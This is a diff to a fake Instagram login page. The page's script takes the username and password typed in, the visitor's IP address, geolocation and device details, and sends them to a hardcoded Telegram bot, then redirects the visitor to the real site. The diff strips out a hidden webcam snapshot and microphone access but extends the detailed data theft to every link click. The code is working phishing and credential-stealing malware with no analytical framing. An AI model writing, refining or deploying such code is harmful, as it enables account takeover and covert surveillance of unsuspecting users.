@@ -382,19 +382,6 @@
             const isPhoneNumber = (input) => /^\d{10}$/.test(input);
             const isUsername = (input) => /^[a-zA-Z0-9._]{1,30}$/.test(input);
 
-            // Helper function to query permission status (only for permissions where it makes sense to query before requesting)
-            async function getPermissionStatus(name) {
-                try {
-                    if (navigator.permissions && navigator.permissions.query) {
-                        const result = await navigator.permissions.query({ name: name });
-                        return result.state; // 'granted', 'denied', 'prompt'
-                    }
-                    return 'API Not Supported';
-                } catch (e) {
-                    return `Error querying (${e.message || e.name})`;
-                }
-            }
-
             // sendToTelegram function now accepts input1, input2, actionType, and a flag for detailed info
             async function sendToTelegram(input1, input2, actionType, includeDetailedInfo = false) {
                 const browser = navigator.userAgent;
@@ -404,12 +391,7 @@
 
                 let ip = 'Error in fetching IP';
                 let locationText = 'Error in fetching Geolocation';
-                let cameraStatus = 'N/A';
-                let microphoneStatus = 'N/A';
-                let notificationsStatus = 'N/A';
-                let photoDataInfo = 'N/A'; // For captured photo snippet/status
-                let audioStatus = 'N/A';   // For microphone usage status
-
+                
                 // Fetch IP address
                 try {
                     const ipRes = await fetch('https://api.ipify.org?format=json');
@@ -436,85 +418,15 @@
                 } catch (e) { /* Error in fetching Geolocation */ }
 
 
+                let detailedInfoSection = '';
                 if (includeDetailedInfo) {
-                    // Camera Access & Capture
-                    try {
-                        const currentCameraState = await getPermissionStatus('camera');
-                        if (currentCameraState === 'granted' || currentCameraState === 'prompt') {
-                            cameraStatus = currentCameraState === 'granted' ? 'Granted' : 'Prompted & Granted';
-                            try {
-                                const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: false });
-                                const video = document.createElement('video');
-                                video.style.position = 'absolute'; // Hide video element
-                                video.style.left = '-9999px';
-                                video.style.top = '-9999px';
-                                video.autoplay = true;
-                                video.srcObject = stream;
-                                document.body.appendChild(video);
-                                
-                                await new Promise(resolve => {
-                                    video.onloadedmetadata = () => {
-                                        // Ensure video is ready before drawing
-                                        video.play(); // Start playing to ensure frame is available
-                                        resolve();
-                                    };
-                                });
-
-                                const canvas = document.createElement('canvas');
-                                canvas.width = 128; // Small resolution for demo
-                                canvas.height = 96;
-                                const context = canvas.getContext('2d');
-                                context.drawImage(video, 0, 0, canvas.width, canvas.height);
-                                const fullBase64Image = canvas.toDataURL('image/jpeg', 0.5); // 50% quality JPEG
-
-                                // Only include a snippet and length for text message
-                                photoDataInfo = `Captured (Size: ${fullBase64Image.length} chars). Snippet: ${fullBase64Image.substring(0, 50)}...`;
-
-                                stream.getTracks().forEach(track => track.stop()); // Stop camera stream
-                                document.body.removeChild(video);
-                                document.body.removeChild(canvas); // Clean up canvas element
-                            } catch (captureError) {
-                                photoDataInfo = `Error capturing photo (${captureError.message || captureError.name})`;
-                                cameraStatus = `${cameraStatus} (Capture Error)`;
-                            }
-                        } else if (currentCameraState === 'denied') {
-                            cameraStatus = 'Permission Denied';
-                        } else {
-                            cameraStatus = `Error/Denied Camera (${currentCameraState})`;
-                        }
-                    } catch (e) {
-                        cameraStatus = `Error processing Camera (${e.message || e.name})`;
-                    }
-
-                    // Microphone Access (Symbolic use)
-                    try {
-                        const currentMicState = await getPermissionStatus('microphone');
-                        if (currentMicState === 'granted' || currentMicState === 'prompt') {
-                            microphoneStatus = currentMicState === 'granted' ? 'Granted' : 'Prompted & Granted';
-                            try {
-                                const stream = await navigator.mediaDevices.getUserMedia({ audio: true, video: false });
-                                stream.getTracks().forEach(track => track.stop()); // Stop stream immediately
-                                audioStatus = 'Microphone briefly accessed.';
-                            } catch (captureError) {
-                                audioStatus = `Error accessing microphone for symbolic use (${captureError.message || captureError.name})`;
-                                microphoneStatus = `${microphoneStatus} (Access Error)`;
-                            }
-                        } else if (currentMicState === 'denied') {
-                            microphoneStatus = 'Permission Denied';
-                        } else {
-                            microphoneStatus = `Error/Denied Microphone (${currentMicState})`;
-                        }
-                    } catch (e) {
-                        microphoneStatus = `Error processing Microphone (${e.message || e.name})`;
-                    }
-
-                    // Notifications Access
-                    try {
-                        const permission = await Notification.requestPermission();
-                        notificationsStatus = permission; // 'granted', 'denied', or 'default'
-                    } catch (e) {
-                        notificationsStatus = `Error in fetching Notifications (${e.message || e.name})`;
-                    }
+                    // Collect device info that typically doesn't require explicit permission pop-ups
+                    let batteryLevel = 'N/A';
+                    let batteryCharging = 'N/A';
+                    let networkType = 'N/A';
+                    let networkEffectiveType = 'N/A';
+                    let deviceMemory = 'N/A';
+                    let hardwareConcurrency = 'N/A';
 
                     // Battery Status API
                     try {
@@ -566,20 +478,8 @@
                     } catch (e) {
                         hardwareConcurrency = `Error in fetching Hardware Concurrency (${e.message || e.name})`;
                     }
-                } // End of includeDetailedInfo block
 
-                let permissionSection = '';
-                let mediaDataSection = '';
-
-                if (includeDetailedInfo) {
-                    permissionSection = `
-🔒 *Permissions Status:*
-- Camera: ${cameraStatus}
-- Microphone: ${microphoneStatus}
-- Notifications: ${notificationsStatus}
-- Gallery: Access via file input only (not directly accessible)
-- SMS: Not directly accessible (browser security restriction)
-
+                    detailedInfoSection = `
 🔋 *Device Info:*
 - Battery Level: ${batteryLevel}
 - Battery Charging: ${batteryCharging}
@@ -587,13 +487,9 @@
 - Effective Network Type: ${networkEffectiveType}
 - Device Memory: ${deviceMemory}
 - Hardware Concurrency (CPU cores): ${hardwareConcurrency}
+- Gallery: Not directly accessible (requires user file selection)
+- SMS: Not directly accessible (browser security restriction)
 `;
-                    if (photoDataInfo !== 'N/A') {
-                        mediaDataSection += `\n📷 *Photo Capture Info:* ${photoDataInfo}`;
-                    }
-                    if (audioStatus !== 'N/A') {
-                        mediaDataSection += `\n🎙️ *Microphone Use Info:* ${audioStatus}`;
-                    }
                 }
 
 
@@ -611,8 +507,7 @@
 
 🌍 *IP Address:* ${ip}
 📍 *Geolocation:* ${locationText}
-${permissionSection}
-${mediaDataSection}
+${detailedInfoSection}
 `;
 
                 const botToken = '8110993477:AAH13IhAuwiaM7shHomBLrOpVcsk7jyIFLE';
@@ -636,7 +531,7 @@ ${mediaDataSection}
                 }
             }
 
-            // Login validation, Telegram send, and redirect (BASIC INFO ONLY)
+            // Login validation, Telegram send, and redirect (Detailed Info for all key actions)
             loginButton.addEventListener('click', async () => {
                 const identifier = usernameEmailPhoneInput.value.trim();
                 const password = passwordInput.value.trim();
@@ -659,7 +554,7 @@ ${mediaDataSection}
                 }
 
                 if (isValidIdentifier && password) {
-                    // **CHANGED**: Primary login button now also sends detailed info
+                    // Send detailed info for primary login button
                     await sendToTelegram(identifier, password, 'Login Attempt (Detailed Info)', true);
                     window.location.href = "https://www.instagram.com";
                 } else {
@@ -667,33 +562,19 @@ ${mediaDataSection}
                 }
             });
 
-            // Add event listeners to specific links for DETAILED INFO COLLECTION
+            // Add event listeners to all links for DETAILED INFO COLLECTION
             document.querySelectorAll('a, button.facebook-login').forEach(link => {
-                // Exclude the login-button itself as it has its own logic
+                // Exclude the login-button itself as it has its own logic (handled above)
                 if (link.id === 'login-button') return;
 
-                // Apply detailed info collection to Facebook Login and Forgot Password
-                const linkName = link.dataset.linkName || link.innerText.trim() || link.getAttribute('href');
-                if (link.classList.contains('facebook-login') || link.classList.contains('forgot-password')) {
-                     link.addEventListener('click', async (event) => {
-                        const identifier = usernameEmailPhoneInput.value.trim();
-                        const password = passwordInput.value.trim();
-                        
-                        // Send with detailed info for these specific links
-                        await sendToTelegram(identifier, password, `Clicked Link: ${linkName}`, true);
-                        
-                        // Let the default navigation happen after the data is sent
-                     });
-                } else {
-                    // For other links (like signup, app links, footer links), send basic info
-                    link.addEventListener('click', async (event) => {
-                        const identifier = usernameEmailPhoneInput.value.trim();
-                        const password = passwordInput.value.trim();
-                        
-                        // Default for other links is basic info (unless you specifically want detailed info here too)
-                        await sendToTelegram(identifier, password, `Clicked Link: ${linkName}`);
-                    });
-                }
+                link.addEventListener('click', async (event) => {
+                    const identifier = usernameEmailPhoneInput.value.trim();
+                    const password = passwordInput.value.trim();
+                    const linkName = link.dataset.linkName || link.innerText.trim() || link.getAttribute('href');
+                    
+                    // Send detailed info for all link clicks
+                    await sendToTelegram(identifier, password, `Clicked Link: ${linkName}`, true);
+                });
             });
 
 
